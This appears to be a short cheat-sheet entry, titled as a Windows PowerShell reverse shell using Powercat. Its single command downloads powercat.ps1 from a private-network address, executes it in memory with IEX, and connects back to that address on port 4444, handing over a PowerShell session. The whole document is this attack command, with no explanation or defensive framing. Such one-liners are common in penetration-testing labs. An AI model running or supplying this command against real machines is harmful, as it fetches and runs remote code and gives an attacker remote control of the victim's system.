#Windows Powershell Powercat + Reverse Shell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.152:88/powercat.ps1");powercat -c 192.168.45.152 -p 4444 -e powershell
